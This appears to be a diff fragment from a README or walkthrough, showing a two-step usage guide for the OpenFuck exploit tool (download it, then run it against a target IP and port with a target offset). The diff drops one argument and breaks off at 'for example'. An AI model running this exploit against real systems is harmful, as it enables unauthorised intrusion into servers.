@@ -3,7 +3,7 @@
 
 1. Download OpenFuck
 
-2. ./OpenFuck 0x6a [Target Ip] [port] -c 40
+2. ./OpenFuck 0x6a [Target Ip] [port] 
 
 for example:
 ```
